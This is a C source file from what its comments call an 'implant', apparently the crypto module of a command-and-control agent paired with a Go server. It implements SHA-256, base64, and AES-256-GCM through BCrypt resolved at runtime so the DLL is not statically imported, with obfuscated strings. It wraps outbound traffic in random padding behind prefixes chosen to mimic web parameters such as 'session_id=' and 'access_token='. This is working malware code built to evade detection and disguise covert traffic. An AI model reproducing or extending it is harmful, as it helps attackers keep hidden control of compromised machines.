/*
 * crypto.c — Encryption layer matching the Go server's crypto.Manager.
 *
 * Wire format (outbound, C→server):
 *   marker_prefix + base64( nonce[12] || AES-256-GCM(padded_plaintext) || tag[16] )
 *
 *   padded_plaintext = [paddingSize(1)] [random_padding(paddingSize)] [plaintext]
 *
 * C implant does NOT gzip-compress (the server checks for gzip magic 1f8b and
 * skips decompression if absent — see pkg/crypto/crypto.go).
 *
 * AES-256-GCM via dynamically-resolved BCrypt (no static bcrypt.dll import).
 * SHA-256 implemented in pure C.
 * Base64 standard alphabet.
 */
#include "../include/implant.h"
#include "../include/obfstr.h"
#include <string.h>

/* ── BCrypt function pointers ────────────────────────────────────────────── */
pfnBCryptOpenAlgorithmProvider   pBCryptOpenAlgorithmProvider  = NULL;
pfnBCryptCloseAlgorithmProvider  pBCryptCloseAlgorithmProvider = NULL;
pfnBCryptSetProperty             pBCryptSetProperty            = NULL;
pfnBCryptGenerateSymmetricKey    pBCryptGenerateSymmetricKey   = NULL;
pfnBCryptDestroyKey              pBCryptDestroyKey             = NULL;
pfnBCryptEncrypt                 pBCryptEncrypt                = NULL;
pfnBCryptDecrypt                 pBCryptDecrypt                = NULL;

/* ── Obfuscation marker pool (matches Go crypto.go) ─────────────────────── */
static const char *s_markers[] = {
    "session_id=","token=","data=","payload=","content=","response=",
    "auth=","sig=","nonce=","hash=","checksum=","digest=",
    "state=","code=","ticket=","ref=","key=","id=",
    "value=","body=","msg=","blob=","raw=","enc=",
    "t=","v=","q=","r=","s=","x=",
    "client_id=","request_id=","trace_id=","span_id=","correlation_id=",
    "access_token=","refresh_token=","bearer=","api_key=","csrf=",
    "challenge=","proof=","assertion=","grant=","scope=",
};
#define NUM_MARKERS (sizeof(s_markers)/sizeof(s_markers[0]))

/* ─────────────────────────────────────────────────────────────────────────── */

/* ── SHA-256 (pure C, FIPS 180-4) ────────────────────────────────────────── */
#define ROR32(x,n) (((x)>>(n))|((x)<<(32-(n))))
static const DWORD K256[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2,
};

void Sha256(const BYTE *data, SIZE_T len, BYTE out[SHA256_LEN]) {
    DWORD h[8] = {
        0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,
        0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19,
    };
    /* Process message in 512-bit (64-byte) blocks */
    SIZE_T totalBits = len * 8;
    SIZE_T padded    = ((len + 9 + 63) / 64) * 64;
    BYTE  *msg = (BYTE*)ImplantAlloc(padded);
    if (!msg) return;
    memcpy(msg, data, len);
    msg[len] = 0x80;
    memset(msg + len + 1, 0, padded - len - 1);
    /* Store total bit length as big-endian 64-bit at end */
    for (int i = 0; i < 8; i++)
        msg[padded - 8 + i] = (BYTE)(totalBits >> (56 - 8*i));

    for (SIZE_T blk = 0; blk < padded; blk += 64) {
        DWORD w[64];
        for (int i = 0; i < 16; i++) {
            w[i] = ((DWORD)msg[blk+i*4]<<24)|((DWORD)msg[blk+i*4+1]<<16)|
                   ((DWORD)msg[blk+i*4+2]<<8)|((DWORD)msg[blk+i*4+3]);
        }
        for (int i = 16; i < 64; i++) {
            DWORD s0 = ROR32(w[i-15],7)^ROR32(w[i-15],18)^(w[i-15]>>3);
            DWORD s1 = ROR32(w[i-2],17)^ROR32(w[i-2],19)^(w[i-2]>>10);
            w[i] = w[i-16]+s0+w[i-7]+s1;
        }
        DWORD a=h[0],b=h[1],c=h[2],d=h[3],e=h[4],f=h[5],g=h[6],hh=h[7];
        for (int i = 0; i < 64; i++) {
            DWORD S1=(ROR32(e,6)^ROR32(e,11)^ROR32(e,25));
            DWORD ch=((e&f)^((~e)&g));
            DWORD tmp1=hh+S1+ch+K256[i]+w[i];
            DWORD S0=(ROR32(a,2)^ROR32(a,13)^ROR32(a,22));
            DWORD maj=((a&b)^(a&c)^(b&c));
            DWORD tmp2=S0+maj;
            hh=g; g=f; f=e; e=d+tmp1;
            d=c; c=b; b=a; a=tmp1+tmp2;
        }
        h[0]+=a; h[1]+=b; h[2]+=c; h[3]+=d;
        h[4]+=e; h[5]+=f; h[6]+=g; h[7]+=hh;
    }
    ImplantFree(msg);
    for (int i = 0; i < 8; i++) {
        out[i*4+0]=(BYTE)(h[i]>>24);
        out[i*4+1]=(BYTE)(h[i]>>16);
        out[i*4+2]=(BYTE)(h[i]>>8);
        out[i*4+3]=(BYTE)(h[i]);
    }
}

/* ── Base64 standard encode/decode ──────────────────────────────────────── */
static const char B64C[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

int Base64Encode(const BYTE *in, int inLen, char *out, int outCap) {
    int j = 0;
    for (int i = 0; i < inLen; ) {
        DWORD v  = 0;
        int   n  = 0;
        while (n < 3 && i < inLen) { v = (v << 8) | in[i++]; n++; }
        v <<= (3 - n) * 8;
        for (int k = 0; k < 4; k++) {
            if (j + 1 >= outCap) return -1;
            if (k < n + 1)
                out[j++] = B64C[(v >> (18 - 6*k)) & 0x3F];
            else
                out[j++] = '=';
        }
    }
    out[j] = '\0';
    return j;
}

static int b64val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

int Base64Decode(const char *in, int inLen, BYTE *out, int outCap) {
    int j = 0;
    for (int i = 0; i < inLen; ) {
        /* skip whitespace */
        while (i < inLen && (in[i] == '\r' || in[i] == '\n' || in[i] == ' ')) i++;
        if (i >= inLen) break;
        int v[4] = {0,0,0,0};
        int got = 0;
        for (int k = 0; k < 4 && i < inLen; k++) {
            char ch = in[i++];
            if (ch == '=') break;
            int val = b64val(ch);
            if (val < 0) continue;
            v[k] = val;
            got++;
        }
        if (got < 2) break;
        if (j + 1 > outCap) return -1;
        out[j++] = (BYTE)((v[0]<<2)|(v[1]>>4));
        if (got >= 3 && j < outCap) out[j++] = (BYTE)((v[1]<<4)|(v[2]>>2));
        if (got >= 4 && j < outCap) out[j++] = (BYTE)((v[2]<<6)|v[3]);
    }
    return j;
}

/* ── BCrypt init ──────────────────────────────────────────────────────────── */
BOOL CryptoInit(void) {
    HMODULE hB = g_LoadLibraryA(OBFSTR("bcrypt.dll"));
    if (!hB) return FALSE;

#define RESOLVE(var, name) \
    var = (pfn##name)g_GetProcAddress(hB, #name); \
    if (!var) return FALSE

    RESOLVE(pBCryptOpenAlgorithmProvider,  BCryptOpenAlgorithmProvider);
    RESOLVE(pBCryptCloseAlgorithmProvider, BCryptCloseAlgorithmProvider);
    RESOLVE(pBCryptSetProperty,            BCryptSetProperty);
    RESOLVE(pBCryptGenerateSymmetricKey,   BCryptGenerateSymmetricKey);
    RESOLVE(pBCryptDestroyKey,             BCryptDestroyKey);
    RESOLVE(pBCryptEncrypt,                BCryptEncrypt);
    RESOLVE(pBCryptDecrypt,                BCryptDecrypt);
#undef RESOLVE

    return TRUE;
}

/* ── AES-256-GCM encrypt ─────────────────────────────────────────────────── */
BOOL AesGcmEncrypt(const BYTE *key, const BYTE *nonce, const BYTE *pt, DWORD ptLen,
                   BYTE *ct, BYTE *tag) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BOOL ok = FALSE;

    if (!NT_SUCCESS(pBCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        goto out;
    if (!NT_SUCCESS(pBCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
            (PUCHAR)BCRYPT_CHAIN_MODE_GCM, (ULONG)(wcslen(BCRYPT_CHAIN_MODE_GCM)+1)*2, 0)))
        goto out;
    if (!NT_SUCCESS(pBCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
            (PUCHAR)key, AES_KEY_LEN, 0)))
        goto out;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce = (PUCHAR)nonce;
    ai.cbNonce = GCM_NONCE_LEN;
    ai.pbTag   = tag;
    ai.cbTag   = GCM_TAG_LEN;

    ULONG done = 0;
    ok = NT_SUCCESS(pBCryptEncrypt(hKey, (PUCHAR)pt, ptLen, &ai,
                                   NULL, 0, ct, ptLen, &done, 0));
out:
    if (hKey) pBCryptDestroyKey(hKey);
    if (hAlg) pBCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

/* ── AES-256-GCM decrypt ─────────────────────────────────────────────────── */
BOOL AesGcmDecrypt(const BYTE *key, const BYTE *nonce, const BYTE *ct, DWORD ctLen,
                   const BYTE *tag, BYTE *pt) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BOOL ok = FALSE;

    if (!NT_SUCCESS(pBCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        goto out;
    if (!NT_SUCCESS(pBCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
            (PUCHAR)BCRYPT_CHAIN_MODE_GCM, (ULONG)(wcslen(BCRYPT_CHAIN_MODE_GCM)+1)*2, 0)))
        goto out;
    if (!NT_SUCCESS(pBCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
            (PUCHAR)key, AES_KEY_LEN, 0)))
        goto out;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce = (PUCHAR)nonce;
    ai.cbNonce = GCM_NONCE_LEN;
    ai.pbTag   = (PUCHAR)tag;
    ai.cbTag   = GCM_TAG_LEN;

    ULONG done = 0;
    ok = NT_SUCCESS(pBCryptDecrypt(hKey, (PUCHAR)ct, ctLen, &ai,
                                   NULL, 0, pt, ctLen, &done, 0));
out:
    if (hKey) pBCryptDestroyKey(hKey);
    if (hAlg) pBCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

/* ── ImplantEncrypt — build full wire-format ciphertext string ────────────── */
char *ImplantEncrypt(const BYTE *data, DWORD dataLen) {
    /* 1. Build padded plaintext: [paddingSize(1)] [randomPad(paddingSize)] [data] */
    BYTE  padSize = (BYTE)(1 + (dataLen % 16));  /* 1..16 */
    DWORD paddedLen = 1 + padSize + dataLen;
    BYTE *padded = (BYTE*)ImplantAlloc(paddedLen);
    if (!padded) return NULL;
    padded[0] = padSize;
    RandBytes(padded + 1, padSize);
    memcpy(padded + 1 + padSize, data, dataLen);

    /* 2. Generate random 12-byte nonce */
    BYTE nonce[GCM_NONCE_LEN];
    RandBytes(nonce, GCM_NONCE_LEN);

    /* 3. AES-256-GCM encrypt */
    BYTE *ct  = (BYTE*)ImplantAlloc(paddedLen);
    BYTE  tag[GCM_TAG_LEN];
    if (!ct || !AesGcmEncrypt(g_agent.aes_key, nonce, padded, paddedLen, ct, tag)) {
        ImplantFree(padded);
        ImplantFree(ct);
        return NULL;
    }
    ImplantFree(padded);

    /* 4. Assemble: nonce || ciphertext || tag */
    DWORD rawLen = GCM_NONCE_LEN + paddedLen + GCM_TAG_LEN;
    BYTE *raw = (BYTE*)ImplantAlloc(rawLen);
    if (!raw) { ImplantFree(ct); return NULL; }
    memcpy(raw,                       nonce, GCM_NONCE_LEN);
    memcpy(raw + GCM_NONCE_LEN,       ct,    paddedLen);
    memcpy(raw + GCM_NONCE_LEN + paddedLen, tag, GCM_TAG_LEN);
    ImplantFree(ct);

    /* 5. Base64 encode */
    int b64Cap = (rawLen * 4 / 3) + 8;
    char *b64 = (char*)ImplantAlloc(b64Cap);
    if (!b64) { ImplantFree(raw); return NULL; }
    int b64Len = Base64Encode(raw, (int)rawLen, b64, b64Cap);
    ImplantFree(raw);
    if (b64Len < 0) { ImplantFree(b64); return NULL; }

    /* 6. Pick random marker and prepend */
    DWORD markerIdx = RandDword() % (DWORD)NUM_MARKERS;
    const char *marker = s_markers[markerIdx];
    int markerLen = (int)strlen(marker);
    char *result = (char*)ImplantAlloc(markerLen + b64Len + 1);
    if (!result) { ImplantFree(b64); return NULL; }
    memcpy(result, marker, markerLen);
    memcpy(result + markerLen, b64, b64Len);
    result[markerLen + b64Len] = '\0';
    ImplantFree(b64);
    return result;
}

/* ── ImplantDecrypt — decode/decrypt full wire-format ciphertext string ──── */
BYTE *ImplantDecrypt(const char *encoded, DWORD *outLen) {
    if (!encoded) return NULL;

    /* Remove obfuscation marker prefix */
    const char *b64start = encoded;
    for (int i = 0; i < (int)NUM_MARKERS; i++) {
        int mLen = (int)strlen(s_markers[i]);
        if (strncmp(encoded, s_markers[i], mLen) == 0) {
            b64start = encoded + mLen;
            break;
        }
    }

    /* Base64 decode */
    int b64Len = (int)strlen(b64start);
    int rawCap = (b64Len * 3 / 4) + 4;
    BYTE *raw = (BYTE*)ImplantAlloc(rawCap);
    if (!raw) return NULL;
    int rawLen = Base64Decode(b64start, b64Len, raw, rawCap);
    if (rawLen < GCM_NONCE_LEN + GCM_TAG_LEN) {
        ImplantFree(raw); return NULL;
    }

    /* Split: nonce | ciphertext | tag */
    BYTE  *nonce = raw;
    DWORD  ctLen = (DWORD)rawLen - GCM_NONCE_LEN - GCM_TAG_LEN;
    BYTE  *ct    = raw + GCM_NONCE_LEN;
    BYTE  *tag   = ct  + ctLen;

    /* AES-256-GCM decrypt */
    BYTE *padded = (BYTE*)ImplantAlloc(ctLen + 1);
    if (!padded) { ImplantFree(raw); return NULL; }
    if (!AesGcmDecrypt(g_agent.aes_key, nonce, ct, ctLen, tag, padded)) {
        ImplantFree(raw); ImplantFree(padded); return NULL;
    }
    ImplantFree(raw);

    /* Remove padding: [paddingSize(1)] [padding(paddingSize)] [data] */
    if (ctLen < 1) { ImplantFree(padded); return NULL; }
    BYTE padSize = padded[0];
    if ((DWORD)(1 + padSize) >= ctLen) { ImplantFree(padded); return NULL; }
    DWORD dataLen = ctLen - 1 - padSize;
    BYTE *result  = (BYTE*)ImplantAlloc(dataLen + 1);
    if (!result) { ImplantFree(padded); return NULL; }
    memcpy(result, padded + 1 + padSize, dataLen);
    result[dataLen] = '\0';
    ImplantFree(padded);

    if (outLen) *outLen = dataLen;
    return result;
}
